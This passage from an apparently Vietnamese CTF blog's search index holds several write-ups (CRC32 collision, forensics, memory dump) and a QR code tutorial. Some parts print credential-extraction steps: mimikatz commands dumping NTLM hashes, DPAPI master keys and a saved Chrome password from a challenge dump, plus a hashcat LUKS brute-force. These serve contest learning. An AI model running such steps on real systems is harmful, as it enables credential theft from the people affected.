flag.zip. Và file flag.zip được lưu từ gói tin thứ 6 dến gói tin thứ 13. Extract file zip và giải nén với password: supercomplexpassword, mình có được flag.Flag: CTF{this_flag_is_your_flag}" }, { "title": "[Writeup] ASIS 2019 Quals - Flag collision", "url": "/posts/Writeup-ASIS-2019-Quals-Flag-collision/", "categories": "Writeup, ASIS2019", "tags": "ASIS, writeup", "date": "2019-04-22 00:00:00 +0700", "snippet": "In this challenge, we need to sumbit two string differene but same length and same crc 32. After I try to brute force two string with length is 15 and submit to server, I received the example of ad...", "content": "In this challenge, we need to sumbit two string differene but same length and same crc 32. After I try to brute force two string with length is 15 and submit to server, I received the example of admin is two strings: ASIS{4LEVv9no8} and ASIS{wpQ78d6lk}. These things help me alot becasue in next stages, server will request random length of 2 strings but same crc32.After do some stuff, I realized if we add some stuff to that strings the crc32 still same.For example: CRC32(ASIS{wpQ78d6lkBBB}) and CRC32(ASIS{4LEVv9no8BBB}) is same.Ok so we just need to add “B” word to strings and send to sever and take the flagMy code:import hashlibimport itertoolsfrom pwn import *import sysdef md5(pow_target): pow = \"\" for word in itertools.product(string.printable, repeat=5): if hashlib.md5(''.join(word)).hexdigest()[-6:] == pow_target: pow = ''.join(word) return powdef sha1(pow_target): pow = \"\" for word in itertools.product(string.printable, repeat=5): if hashlib.sha1(''.join(word)).hexdigest()[-6:] == pow_target: pow = ''.join(word) return powdef sha224(pow_target): pow = \"\" for word in itertools.product(string.printable, repeat=5): if hashlib.sha224(''.join(word)).hexdigest()[-6:] == pow_target: pow = ''.join(word) return powdef sha256(pow_target): pow = \"\" for word in itertools.product(string.printable, repeat=5): if hashlib.sha256(''.join(word)).hexdigest()[-6:] == pow_target: pow = ''.join(word) return powdef sha384(pow_target): pow = \"\" for word in itertools.product(string.printable, repeat=5): if hashlib.sha384(''.join(word)).hexdigest()[-6:] == pow_target: pow = ''.join(word) return powdef sha512(pow_target): pow = \"\" for word in itertools.product(string.printable, repeat=5): if hashlib.sha512(''.join(word)).hexdigest()[-6:] == pow_target: pow = ''.join(word) return powhost = '37.139.9.232'port = 19199r = remote(host,port)msg = r.recvuntil('\\n')#print msgmsg = msg.split(' ')#print msgpow_target = msg[-1].strip()if 'md5' in msg[-3]: payload = md5(pow_target)elif 'sha1' in msg[-3]: payload = sha1(pow_target)elif 'sha224' in msg[-3]: payload = sha1(pow_target)elif 'sha256' in msg[-3]: payload = sha256(pow_target)elif 'sha384' in msg[-3]: payload = sha384(pow_target)elif 'sha512' in msg[-3]: payload = sha512(pow_target)else: print msg[-3]r.sendline(payload)#print r.recv(1024)print 'stage1'r.sendline('ASIS{wpQ78d6lk}, ASIS{4LEVv9no8}')#print r.recv(1024)print 'stage2'i=0while 1: a = 'ASIS{4LEVv9no8' b = 'ASIS{wpQ78d6lk' if i == 14: print r.recv(1024) sys.exit() r.recvuntil(':)\\n') msg = r.recvuntil(':|\\n') msg = msg.split(' ') number = int(msg[10]) repeat = number-len(a)-1 a = a + \"b\" * repeat + \"}\" b = b + \"b\" * repeat + \"}\" m = str(a)+', '+str(b) m = str(m) r.sendline(m) i+=1And after 14 times, I got a flag:" }, { "title": "[Writeup] Sunshine CTF 2019 - Forensics", "url": "/posts/Writeup-Sunshine-CTF-2019-Forensics/", "categories": "Writeup, SunshineCTF2019", "tags": "SunshineCTF2019, writeup", "date": "2019-04-01 00:00:00 +0700", "snippet": "GollyIt’s a code of Golly rle file, when I run a code given I just have a alphabet table:Run it and nothing else, I read a rle file document at here. And I know a “$” represents the end of each row...", "content": "GollyIt’s a code of Golly rle file, when I run a code given I just have a alphabet table:Run it and nothing else, I read a rle file document at here. And I know a “$” represents the end of each row and an optional “!” represents the end of the pattern. So I just copy the paragraph after !\\(\\) and I gotFlag: sun{th1s_w0nt_last}CastlesOpen the file in HXD I saw something like a hint:Hey! Mario said something about a hidden key. Hesaid this: F2I and A1S, and that it was in two piecesBecause this is 001 file so I use FTK Imager to open it. And I found an JPG image of Mario:Because it is an JPG file and need a key to open it so I think the right tool would be steghide. Now I need to find a key to have a flag. With the hint above and in slack file in FTK I found something like a password of Castello_Di_Amorosa and Castelo_da_Feira I combined all of it and have a string: AQ273RFGHUI91OLO987YTFGY78IKFlag: flag{7H4NK5_F0R_PL4Y1NG}We Will We WillIt’s img file so I used Autospy to open it, after do some stuff I realize I have a luks file.Luks file is a encrypted image on Linux so I need a password. But I don’t have any hint of password so I think need brute force a password. Hashcat is a good tool for this.hashcat64.exe -a 0 -m 14600 luks rockyou.txtAnd the password is: filosofiaMount it and I have flag is a partition name$sudo cryptsetup open b.luks flagFlag: sun{wrasslin}" }, { "title": "[Writeup] Mates SS3 Round 4", "url": "/posts/Writeup-Mates-SS3-Round-4/", "categories": "Writeup, MatesCTF", "tags": "writeup, forensics, ctf, programing", "date": "2019-01-05 00:00:00 +0700", "snippet": "ProgramingĐề bài làm bắt chúng ta phải làm sao từ 2 bình nước x, y có thể tích vx, vy và phải đong nước làm sao cho được z lít. Đây là bài toàn đong nước kinh điển, may mắn là mình đã được học qua ...", "content": "ProgramingĐề bài làm bắt chúng ta phải làm sao từ 2 bình nước x, y có thể tích vx, vy và phải đong nước làm sao cho được z lít. Đây là bài toàn đong nước kinh điển, may mắn là mình đã được học qua ở trường nên có thể làm được bài này một cách nhanh chóng bằng thuật toán dẫn luật.Soure code:Luat 1: Neu VX day thi do nuoc trong binh X di Luat 2: Neu VY rong thi do day nuoc cho binh YLuat 3: Neu VX khong day va VY khong rong thi trut nuoc tu binh Y sang binh X cho den khi binh X day e lam rong binhf lam day binho do tu binh nay sang binh kiafrom pwn import *host = '125.235.240.166'port = 11223r = remote(host,port)def dongnuoc(Vx,Vy,z): x = 0 y = 0 s = '' s = \"\" while (x!=z) and (y!=z): if x == Vx: x = 0 s += '1:e_' if y == 0: y = Vy s += '2:f_' if y &gt; 0: k = min(Vx-x,y) x = x+k y = y-k s += '2:o_' return sdef agr(): r.recvuntil('1: ') Vx = int(r.recvuntil('\\n').strip()) r.recvuntil('2: ') Vy = int(r.recvuntil('\\n').strip()) r.recvuntil('z: ') z = int(r.recvuntil('\\n').strip()) return Vx,Vy,zfor i in range(5): Vx,Vy,z = agr() s = dongnuoc(Vx,Vy,z) s = s[:-1] r.recvuntil('op&gt; ') r.sendline(s) print r.recvuntil('\\n') print r.recvuntil('\\n')r.interactive()ForensicsĐề bài là một file pcap với giao thức chính là NTP và data strem là một chuỗi base64 nhưng không decode ra gì cả, sau khi xem tổng thể mình để ý thấy có 1 gói tin Malformed packet tra google mình biết đó là PNG bị hỏng trong quá trình chuyển tin. Để ý lại một lần nữa mình mới thấy là bản thân khá fail khi chỉ loại 1 loạt dấu !!! mà không thử loại loạt chữ AAA ở đầu. Thử decdoe bằng đoạn mới mình có một bức ảnh PNG chứa flag:" }, { "title": "[Writeup] Mates SS3 Round 2", "url": "/posts/Writeup-Mates-SS3-Round-2/", "categories": "Writeup, MatesCTF", "tags": "writeup, forensics, ctf", "date": "2018-12-15 00:00:00 +0700", "snippet": "Chúng ta có 2 file, một file dump và 1 file Login Data của Chrome. Btc yều cầu nhập mật khẩu của facebook -&gt; flag là password của account được lưu trong file dump. Sau khi dùng volatility không ...", "content": "Chúng ta có 2 file, một file dump và 1 file Login Data của Chrome. Btc yều cầu nhập mật khẩu của facebook -&gt; flag là password của account được lưu trong file dump. Sau khi dùng volatility không thành công mình để ý đến header thì nó là file minidump mà dạng file này thì dùng mimikatz là best. Bài này cũng hên là trong giải OtterCTF vừa rồi ngoài cách mình viết trong writeup thì có cách khác là dùng mimikatz như plugin của volatility nên mình có tìm hiểu.Để analyze file thì mình load file và xem thử password:mimikatz # sekurlsa::minidump dump.dmpSwitch to MINIDUMP : 'dump.dmp'mimikatz # sekurlsa::logonpasswordsOpening : 'dump.dmp' file for minidump...Authentication Id : 0 ; 370922 (00000000:0005a8ea)Session : Interactive from 1User Name : AdminDomain : TERMINALATORLogon Server : TERMINALATORLogon Time : 12/14/2018 11:35:09 AMSID : S-1-5-21-1143486773-2803761100-3357382775-1000 msv : [00000003] Primary * Username : Admin * Domain : TERMINALATOR * NTLM : 7f59db8bb7564b0774aae7ccb7ca594b * SHA1 : caa5c83a1f28c9e51aeb5727adea95c4fd2f5dfa [00010000] CredentialKeys * NTLM : 7f59db8bb7564b0774aae7ccb7ca594b * SHA1 : caa5c83a1f28c9e51aeb5727adea95c4fd2f5dfa tspkg : wdigest : * Username : Admin * Domain : TERMINALATOR * Password : KeepGoingYouAreOnTheRightTrack&lt;3Ok vậy là mình đúng, tuy nhiên thì mình lại fail ở bước này vì mình cứ nghĩ config một máy ảo làm sao cho đúng password và username để unblob được file database. Sau mấy tiếng search hơn chục page google và stackoverflow, cuối cùng mình mới chắc chắn rằng chỉ có thể decrypt trên chính máy tạo ra file database.Quay lại dùng minikatz mình search google thì thấy đươc một bức ảnh từ twitter của tác giả:Ok, vậy là mimikatz có thể sử dụng để decrypt được chrome password thử dùng như tác giả nhưng chỉ show ra được mỗi gmail đăng nhập. Đọc kỹ wiki và cách decrypt chrome mình rút ra đươc phải load được dpapi (windows data protection) trước thì mới decrypt được password đã bị blob.mimikatz # sekurlsa::dpapiAuthentication Id : 0 ; 370922 (00000000:0005a8ea)Session : Interactive from 1User Name : AdminDomain : TERMINALATORLogon Server : TERMINALATORLogon Time : 12/14/2018 11:35:09 AMSID : S-1-5-21-1143486773-2803761100-3357382775-1000 [00000000] * GUID : {bb6d3aae-4e07-4a9a-9888-e4ed2c68a837} * Time : 12/14/2018 11:58:33 AM * MasterKey : 641bb06ded629dff861f505d9c39aa550a394f021cf20d1966848f990c3a1b6759382115a785409553488227b6fb8abd80baca563a7fbf91afd0a807a3026454 * sha1(key) : 7f2a0c0502063ca113bd608dc6abc52b443c7739Authentication Id : 0 ; 370880 (00000000:0005a8c0)Session : Interactive from 1User Name : AdminDomain : TERMINALATORLogon Server : TERMINALATORLogon Time : 12/14/2018 11:35:09 AMSID : S-1-5-21-1143486773-2803761100-3357382775-1000Authentication Id : 0 ; 997 (00000000:000003e5)Session : Service from 0User Name : LOCAL SERVICEDomain : NT AUTHORITYLogon Server : (null)Logon Time : 12/14/2018 11:34:35 AMSID : S-1-5-19Authentication Id : 0 ; 996 (00000000:000003e4)Session : Service from 0User Name : TERMINALATOR$Domain : SKAINETLogon Server : (null)Logon Time : 12/14/2018 11:34:35 AMSID : S-1-5-20Authentication Id : 0 ; 57144 (00000000:0000df38)Session : UndefinedLogonType from 0User Name : (null)Domain : (null)Logon Server : (null)Logon Time : 12/14/2018 11:34:34 AMSID :Authentication Id : 0 ; 999 (00000000:000003e7)Session : UndefinedLogonType from 0User Name : TERMINALATOR$Domain : SKAINETLogon Server : (null)Logon Time : 12/14/2018 11:34:34 AMSID : S-1-5-18 [00000000] * GUID : {6dbca713-4f3e-4a53-b01a-ec14ee8391eb} * Time : 12/14/2018 11:35:14 AM * MasterKey : a9c38f628c55d302805671060ed1d0ac9562ab3f642287afc98f2d1a5bd1d4a3aa64934badfdf34c0800a506b5c505fa84436cd24822d498d9cd7b1784497561 * sha1(key) : 6df946f6c45b9b9ea97138d1d0bde6a7b2b70659 [00000001] * GUID : {f22e410f-f947-4e08-8f2a-8f65df603f8d} * Time : 12/14/2018 11:34:35 AM * MasterKey : 19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa * sha1(key) : b859b2b52e7e49cf5c70069745c88853c4b23487mimikatz # dpapi::chrome /in:logindataURL : https://www.facebook.com/ ( https://www.facebook.com/ )Username: nyaacate+fakefb@gmail.com * volatile cache: GUID:{bb6d3aae-4e07-4a9a-9888-e4ed2c68a837};KeyHash:7f2a0c0502063ca113bd608dc6abc52b443c7739Password: matesctf{it's_4lm0st_2019_t1m3_2_upgr8_to_w1nd0w$_10}Và mình có được password là flag như suy nghĩ ban đầu.Flag: matesctf{it’s_4lm0st_2019_t1m3_2_upgr8_to_w1nd0w$_10}Là người first blood được câu này mình khá vui vì dù sao cũng được quà bonus của ban tổ chức 😀 mong là mấy round sau vẫn sẽ có vụ này để anh em thêm phần tranh đua 👍Còn câu your a lizard, harry mình chỉ biết nó dùng SMB protocol và có lẽ là lỗi ehernalblue để gửi và nhận cái gì đó, nhưng mò vẫn chưa ra.😁 Đi cổ vũ đội nhà thôi.Việt Nam vô địch ☝☝☝☝☝" }, { "title": "QR Code", "url": "/posts/tim-hieu-ma-qr/", "categories": "Research, Forensics", "tags": "qrcode, forensics", "date": "2018-12-02 00:00:00 +0700", "snippet": "QR là viết tắt của quick response, là một loại mã vạch đặc biệt có thể mã hóa thông tin như số, chữ cái, và kí tự kanji được tạo bởi công ty Denso-Wave là một công ty con của tập đoàn Toyota.Hiện n...", "content": "QR là viết tắt của quick response, là một loại mã vạch đặc biệt có thể mã hóa thông tin như số, chữ cái, và kí tự kanji được tạo bởi công ty Denso-Wave là một công ty con của tập đoàn Toyota.Hiện nay có rất nhiều loại QR code như: QR code model 1 &amp; 2: loại chúng ta thường thấy. Micro QR code: một loại QR code nhỏ. SQRC, iQR code, frame QR code,…Trong bài viết này mình sẽ chỉ tập trung vào QR code model 2 vì từ tháng 9 năm 2006 ISO ISO/IEC 18004 cũng đã loại việc đọc mã QR code model 1 (đoạn này mình không biết nói sao cho đúng ý nhất nhưng vì sự vượt trội của QR model 2 nên phải loại model 1 để có tính thống nhất ấy).QR model 1Mã QR code gốc có thể mã hóa 1167 số và có tối đa 14 phiên bản (73x73)QR model 2Bản cải thiện của model 1 có thể mã hóa 7089 số và có tối đa 40 phiên bản (177x177).Mã QR luôn có hình vuông và được phân chia làm 40 phiên bản dựa vào kích thước của chúng. Phiên bản 1 sẽ có kích thước là 21x21. Phiên bản 2 sẽ có kích thước là 25x25. Phiên bản 3 sẽ có kích thước là 29x29. Và cứ mỗi phiên bản sau sẽ lớn hơn phiên bản trước 4 đơn vị và đến phiên bản tối đa là 40 với kích thước là 177x177.Kích thước của mã QR được xác định bởi công thức: **(V - 1) * 4 + 21** với V là phiên bản mã QRVây với phiên bản 30 ta sẽ có kích thước là 137x137.Về kích thước:Chắc hẳn các bạn sẽ thắc mắc tại sao có những ảnh phiên bản khác nhau nhưng lại cùng kích thước. Lý do là kích thước đó phụ thuộc vào bạn quy định bao nhiêu pixel cho một hàng, cột. Nếu bạn quy định 1 pixel là 1 hàng và 1 cột thì kích thước của 2 ảnh chắc chắn sẽ khác nhau. Vì vậy thay vì quyết định dựa trên số pixel của bức ảnh hãy dựa vào số hàng và cột của QR code đó. Trong bài viết này mình dựa vào hàng và cột như vậy sẽ dễ phân biệt và thuận tiện hơn trong bài viết.Về dung lượng:Dung lượng của mã QR phụ thuộc vào cấp độ sửa lỗi và phiên bản. Có bốn chế độ dữ liệu bao gồm: số, chữ và số, nhị phân, chữ kanji. Và bốn chế độ sửa lỗi: L, M, Q, H (mình sẽ nói kỹ hơn ở dưới). Các bạn có thể truy cập trang này đễ xem dung lượng tối đa mà mã QR có thể chứa dựa trên cấp sửa lỗi.Về màu sắc mã:QR luôn có hai màu là đen và trắng trong đó đen sẽ đại diện cho bit 1 còn trắng đại diện cho bit 0.Cấu trúc của mã QR được thể hiện qua hình sau:Vùng finderVùng finder là 3 ô vuông đen lớn ở ba góc trái trên, phải trên và trái dưới bất kể phiên bản mã QR nào. Vùng này giúp cho thiết bị đọc mã xác định đươc ảnh QR và thực hiện việc đọc dữ liệu. Chính nhờ có vùng này mà khi chúng ta quay ảnh QR ngang, chéo thì điên thoại chúng ta vẫn có thể đọc được.Mỗi ô vuông của vùng finder luôn có viền màu đen bên ngoài kích thước là 7 bên trong là một hình vuông trắng kích thước 5 và ở giữa là ô vuông đen 3x3.Để xác định ví trị đặt 3 ô finder ta có công thức tính như sau: Góc trái trên luôn luôn đặt tại vị trí (0,0) Góc trái dưới đặt tại ví trí (x,0) Góc phải trên đăt tại ví trí(0,y) Trong đó x,y được tính bằng công thức: **(V - 1) * 4 + 14** với V là phiên bản mã QRPhiên bản 1Vùng separatorsLà vùng trắng bao quanh vùng finder giúp tách vùng finder và phần còn lại của mã QR.Vùng alignmentCó công dụng tương tự như vùng finder nhưng nhỏ hơn. Vùng này chỉ xuất hiện từ phiên bản 2 đến phiên bản 40. Vùng alignment có cấu trúc gần giống với finder, là một ô vuông có viền màu đen cạnh là 5 bên trong là ô vuông trắng cạnh là 3 và ở giữa là ô vuông 1x1.Về vị trí vùng alignment có vị trí cố định và khác vùng finder. Tuy nhiên khi đặt alignment cần chú ý nó không được trùng với các vị trí cấu trúc khác. Như ví dụ dưới đây vùng alignment của phiên bản 2 có thể đặt tại tọa độ là sự kết hợp của 2 số 6 và 18. Nhu vậy ta có 4 vị trí (6,6), (6,18), (18, 6), (18, 18) tuy nhiên chỉ có vị trí (18, 18) là có thể đặt vì ba vùng kia trùng với ví trị của vùng finder.Một ví dụ khác về phiên bản 8:Bảng các số kết hợp của vùng alignment+-----------+------------------------------------+| Phiên bản | Chỉ số hàng để tạo ra cột |+-----------+---+----+----+----+-----+-----+-----+| 2 | 6 | 18 | | | | | |+-----------+---+----+----+----+-----+-----+-----+| 3 | 6 | 22 | | | | | |+-----------+---+----+----+----+-----+-----+-----+| 4 | 6 | 26 | | | | | |+-----------+---+----+----+----+-----+-----+-----+| 5 | 6 | 30 | | | | | |+-----------+---+----+----+----+-----+-----+-----+| 6 | 6 | 34 | | | | | |+-----------+---+----+----+----+-----+-----+-----+| 7 | 6 | 22 | 38 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 8 | 6 | 24 | 42 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 9 | 6 | 26 | 46 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 10 | 6 | 28 | 50 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 11 | 6 | 30 | 54 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 12 | 6 | 32 | 58 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 13 | 6 | 34 | 62 | | | | |+-----------+---+----+----+----+-----+-----+-----+| 14 | 6 | 26 | 46 | 66 | | | |+-----------+---+----+----+----+-----+-----+-----+| 15 | 6 | 26 | 48 | 70 | | | |+-----------+---+----+----+----+-----+-----+-----+| 16 | 6 | 26 | 50 | 74 | | | |+-----------+---+----+----+----+-----+-----+-----+| 17 | 6 | 30 | 54 | 78 | | | |+-----------+---+----+----+----+-----+-----+-----+| 18 | 6 | 30 | 56 | 82 | | | |+-----------+---+----+----+----+-----+-----+-----+| 19 | 6 | 30 | 58 | 86 | | | |+-----------+---+----+----+----+-----+-----+-----+| 20 | 6 | 34 | 62 | 90 | | | |+-----------+---+----+----+----+-----+-----+-----+| 21 | 6 | 28 | 50 | 72 | 94 | | |+-----------+---+----+----+----+-----+-----+-----+| 22 | 6 | 26 | 50 | 74 | 98 | | |+-----------+---+----+----+----+-----+-----+-----+| 23 | 6 | 30 | 54 | 78 | 102 | | |+-----------+---+----+----+----+-----+-----+-----+| 24 | 6 | 28 | 54 | 80 | 106 | | |+-----------+---+----+----+----+-----+-----+-----+| 25 | 6 | 32 | 58 | 84 | 110 | | |+-----------+---+----+----+----+-----+-----+-----+| 26 | 6 | 30 | 58 | 86 | 114 | | |+-----------+---+----+----+----+-----+-----+-----+| 27 | 6 | 34 | 62 | 90 | 118 | | |+-----------+---+----+----+----+-----+-----+-----+| 28 | 6 | 26 | 50 | 74 | 98 | 122 | |+-----------+---+----+----+----+-----+-----+-----+| 29 | 6 | 30 | 54 | 78 | 102 | 126 | |+-----------+---+----+----+----+-----+-----+-----+| 30 | 6 | 26 | 52 | 78 | 104 | 130 | |+-----------+---+----+----+----+-----+-----+-----+| 31 | 6 | 30 | 56 | 82 | 108 | 134 | |+-----------+---+----+----+----+-----+-----+-----+| 32 | 6 | 34 | 60 | 86 | 112 | 138 | |+-----------+---+----+----+----+-----+-----+-----+| 33 | 6 | 30 | 58 | 86 | 114 | 142 | |+-----------+---+----+----+----+-----+-----+-----+| 34 | 6 | 34 | 62 | 90 | 118 | 146 | |+-----------+---+----+----+----+-----+-----+-----+| 35 | 6 | 30 | 54 | 78 | 102 | 126 | 150 |+-----------+---+----+----+----+-----+-----+-----+| 36 | 6 | 24 | 50 | 76 | 102 | 128 | 154 |+-----------+---+----+----+----+-----+-----+-----+| 37 | 6 | 28 | 54 | 80 | 106 | 132 | 158 |+-----------+---+----+----+----+-----+-----+-----+| 38 | 6 | 32 | 58 | 84 | 110 | 136 | 162 |+-----------+---+----+----+----+-----+-----+-----+| 39 | 6 | 26 | 54 | 82 | 110 | 138 | 166 |+-----------+---+----+----+----+-----+-----+-----+| 40 | 6 | 30 | 58 | 86 | 114 | 142 | 170 |+-----------+---+----+----+----+-----+-----+-----+Vùng timmingLà 2 đường nối 3 vùng finder gồm một ngang và một dọc xen kẽ trắng đen và cách phân biệt là dóng thẳng và ngang của 3 ô finder, để dễ hình dung các bạn xem hình minh họa:Module tốiModule tối là module đen luôn đặt bên cạnh vùng tiếm kiếm dưới trái. Ví trí của module tối được xác định (8,y) trong đó y được tính bằng công thức: **(4 * V) + 9** với V là phiên bản của mã QR. Vùng format informationĐây là vùng cực kỳ quan trọng của mã QR nó chứa thông tin của mask và cấp độ sửa lỗi của mã QR. Trước khi đi vào vùng này mình muốn giải thích rõ hơn về mask và cấp độ sữa lỗi.Cấp độ sửa lỗiTrong mỗi mã QR đều sẽ tồn tại 1 cấp độ sửa lỗi. Có 4 cấp độ sửa lỗi trong mã QR là:L (low - thấp) có thể phục hồi nếu mức độ hỏng dưới 7%M (medium - trung bình) có thể phục hồi nếu mức độ hỏng dưới 15%Q (quartile - vừa ) có thể phục hồi nếu mức độ hỏng dưới 25%H (high - cao) có thể phục hồi nếu mức độ hỏng dưới 30%Các cấp độ này cũng được lưu dưới dạng nhị phân với: L - 01 M - 00 Q - 11 H - 10 Sau đó được biến đổi cùng mask và lưu vào vị trí format information. Các cấp độ sửa lỗi này sử dụng kỹ thuật sửa lỗi Reed-Solomon, trong bài viết này mình chỉ xin nói về cấu trúc và thành phần của mã QR còn các thuật toán xin hẹn các bạn trong một bài viết khác (nếu mình có hứng thú tìm hiểu vì cá nhân mình không thích toán lắm 😅).Tuy nhiên có một lưu ý đó là mức độ sửa lỗi càng cao, dữ liệu lưu trữ càng ít vì mã QR phải dùng vùng Error Correction lớn hơn để dự trữ.Để biết được mã QR bạn đang dùng cấp đô lưu trữ nào mời các bạn theo dõi hình minh họa:Dựa vào hình trên ta có thể thấy được 2 vị trí được viền đỏ đại diện cho 2 bit cấp độ sửa lỗi và trong hình đó là loại L với mã nhị phân 11.Còn về mask, đây là một chức năng đổi trắng thành đen và ngược lại, chức năng này nhằm giúp các máy đọc mã QR đọc dễ dàng hơn. Có 8 loại mask và việc dùng loại mask nào cũng như thuật toán mình xin hẹn dịp khác lý do như trên ↑. Còn về cách giải mã mình sẽ đề cập ở dưới.Trong hình minh họa trên dễ thấy rằng mặt dù 2 mã QR cùng một version, cùng một cấp sửa lỗi, và cùng một nội dung chỉ khác mask nhưng chúng ta đã có 2 mã QR khác nhau.Vùng versionTừ phiên bản 7 trở đi sẽ có 18 bit quy định phiên bản của mã QR với hình chữ nhật có kích thước 6x3.Encode và decode trong mã QRTrong phần này mình sẽ chỉ nói về việc đặt các bit như thế nào còn việc encode của từng kiểu dữ liệu cũng như thuật toán encode mình xin không viết tại đây lý do thì như trên :DViệc đặt các bit trắng đen trong mã QR sẽ được đặt bắt đầu từ góc dưới phải hướng lên cho đến khi gặp các bit cấu trúc thì rẽ trái hướng xuống cho đến cạnh dưới sẽ rẽ trái và hướng lên cứ tiếp tục như vậy cho đến hết :Theo chiều hướng lên các bit sẽ đươc đặt như sau:Chiều hướng xuống:Khi gặp alignment:Các bit sẽ bỏ qua alignment và ghi lên ô phía trên nó.Khi gặp vùng timing:Bắt đầu tiếp ở cột bên trái vùng timmingCách decode mã QR:Như đã đề cập ở trên, cách chúng ta decode cũng sẽ giống với cách mà mã QR encode. Tuy nhiên cần chú ý:Ô Enc biểu thị cách encode trong mã QR, có các kiểu enc: Numeric (0001) (10 bit cho 3 số) Alphanumeric (0010) (11 bit cho 2 ký tự) Byte (0100) (8 bit cho 1 ký tự) Kanji (1000) (13 bit cho 1 ký tư) Structured append (0011) ECI (0111) FNC1 (0101) FNC1 (1001) Kết thúc (0000)Hiện nay kiểu encode thông dụng nhất mà chúng ta hay thấy khi đặt vé, link web,… sử dụng kiểu byte encode vì nó dùng 8 bit và được biểu thị theo bảng mã ascii. Có một điểm lưu ý là alphanumeric (chữ hoa và số) chỉ có thể encode chữ hoa và số cùng với một vài kí tự đặt biệt nên rất hạn chế, đó là lý do vì sao kiểu byte vô cùng phổ biến.Ô Len biểu thị cho ta biết chiều dài của dữ liệu trong mã QR. Tùy vào phiên bản mà ta có số bit lưu trữ tương ứng: Encoding Ver. 1–9 Ver. 10–26 Ver. 27–40 Numeric 10 12 14 Alphanumeric 9 11 13 Byte 8 16 16 Kanji 8 10 12 Đầu tiên để decode chúng ta cần phải có một mã QR, và xác định phiên bản của mã QR đó.Ta có 21x21 =&gt; đây là phiên bản 1.Tiếp theo xác định các thành phần của mã QR gồm finder, timing, dark module, format infomation (mask, cấp sửa lỗi).Trong phần màu nâu tiến hành so sánh 3 ô tại vị trí (8,2), (8,3), (8, 4) ta biết được hình QR trên sử dụng mask 100 là kiểu mask nằm ngangSau khi xác định được loại mask sử dụng, chúng ta vẽ mask tương ứng:Chú ý trong quá trình vẽ mask các bạn để ý đến vùng timmingTiếp theo chồng hình QR lên trên maskChúng ta biến đổi theo công thức: Trắng giữ nguyên. Đen không chồng mask vẫn là đen. Đen chồng mask ra trắng. Mask thành đen.Sau khi đã sửa, xác định loại enc và len của mã QRTrong hình trên, mình xác định enc bằng mã bit 0100 là kiểu byte và đây là phiên bản 1 + enc là byte nên len bit sẽ là 8. Như hình thì sau khi đổi chúng ta có chiều dài của dữ liệu sẽ là 4 ký tự. Chắc các bạn thắc mắc tại sao 0-7 lại từ trên xuống dưới thì khi ta vì khi encode 00100000 sẽ viết dãy số từ trái qua phải, từ dưới lên trên trong QR nên ta sẽ decode theo kiểu MSB theo 2 hình hướng dẫn ở bên trên. Về đường việc dữ liệu đi theo đường zigzag ảnh ở trên đã chỉ rõ nhưng mình thêm ảnh này để các bạn dễ hình dung hơn trong việc đặt giá trị:Tiến hành đọc dữ liệu:Công các số có trong bit đen và so sánh với bảng mã ascii trong hệ 10 ta có chữ b. Tương tự ta có các chữ khác trong ảnh QR trên:Vậy ảnh QR chứa chữ blue hoàn toàn khớp so với dữ liệu ảnh ban đầu của chúng ta.Peace!" }, { "title": "[Writeup] Mates SS2 Round 4 - Forensics caigidzay", "url": "/posts/Mates-SS2-Round-4-Forensics-caigidzay/", "categories": "Writeup", "tags": "writeup, forensics, ctf", "date": "2018-05-01 00:00:00 +0700", "snippet": "Trong thử thách này để bài là một file dump, mbr/dos nên mình sẽ dùng auto spy để mở nó xem sao. Đập vào mắt mình là flag.jpg.Mình tốn kha khá thời gian với bức ảnh này vì lúc đầu tưởng đây là thử ...", "content": "Trong thử thách này để bài là một file dump, mbr/dos nên mình sẽ dùng auto spy để mở nó xem sao. Đập vào mắt mình là flag.jpg.Mình tốn kha khá thời gian với bức ảnh này vì lúc đầu tưởng đây là thử thách về stegano tuy nhiên sau khi đọc lại miêu tả đề và thiết nghĩ thì nếu stegano thì ban tổ chức chỉ cần cho file ảnh là xong chứ ai lại cú lừa cho file 6gb để làm stegano :DĐọc lại miêu tả thì Mr.John gửi file flag hay đại loại cái gì đó qua mail thì sẽ hợp lý hơn.Sau một hồi tìm banh mắt giữa 857 cái mail, giỡn chứ mình bấm chữ j để kiếm john trước chứ sao đọc hết nhiêu đó cái mail được :D, thì mình thấy được rằng mail này được gửi cho leia, kiểm tra xem có mail của leia không nào.Ngay lập tức ta biết đây là người john đã gửi file x gì gì đó, extract hết ra và mở file Outbox.dbx bằng Turgs DBX Viewer ta càng khẳng định đây là file mà John đã leak ra ngoài.Trong phần attachments có 1 file doc tên là org_contract.doc. Dùng auto spy tìm theo tên file và extract ra. Oh có password lúc đó cứ nghĩ tới cái hình flag đầu tiên kèm theo cái game trong nội dung mail trên mình thử các kiểu dota2 nhưng không đúng lúc đó kiểu ơ btc xài chiêu à. Nhưng khi đọc lại mail thì hình như mình đã bỏ qua dòngAbout the password to open the file, you should overlook somewhere, it’s already included in the filethử tìm lại trong file doAbout the password to open the file, you should overlook somewhere, it’s already included in the file, thử dùng lệnh strings trong linux ez ta có 1 link imgur:https://imgur.com/a/qHeqyqmLại một lần nữa Doãn huynh xuất hiện, cú lừa lần 2 chăng? :S Thử tải về và dùng zsteg, wew lần này là thật :v đơn giản ta có được password của file doc:Would yout like to open the gate to the super secret treasure?You must be a chosen one, trust me, otherwise you're not qualified enough. Poor you!unless you answered this question, the ancient guardian might take a look at it. It's a key to heal up your life.\"What is the largest value that a signed int32 can store?\"It may starts with the number two, I mean the decimal.Đó là số int32 lớn nhất: 2147483647Cứ ngỡ có được flag để submit nào ngờ lại phải thêm 1 bước nữa là decrypt cái đống webdings trong file doc @@ :Mình đổi sang wingdings rồi dùng trang này để dịch ra flagLúc ra flag mình đang học thực hành trên trường nên để lap 1 bên để dùng máy trường chọn mấy cái hình cho tiện nên chụp đại bằng điện thoại, mọi người thông cảm :))" }, { "title": "[Writeup] VPNT Secathon 2018 - Misc", "url": "/posts/Writeup-VNPT-Secathon-2018/", "categories": "Writeup, VNPTSecathon2018", "tags": "writeup, forensics, ctf", "date": "2018-03-20 00:00:00 +0700", "snippet": "ChayngaydiTrong bài này ban tổ chức cho chúng ta đoạn teaser trailer Chạy ngay 